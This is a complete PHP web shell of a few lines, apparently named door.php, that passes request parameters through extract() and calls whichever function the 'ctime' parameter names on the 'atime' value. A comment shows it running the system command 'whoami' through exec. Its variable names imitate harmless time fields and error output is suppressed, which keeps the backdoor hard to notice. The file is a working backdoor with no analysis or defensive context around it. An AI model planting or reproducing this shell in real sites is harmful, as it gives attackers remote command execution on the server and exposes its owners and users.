<?php

//door.php?ctime=exec&atime=whoami

@extract ($_REQUEST);
@die ($ctime($atime));
?>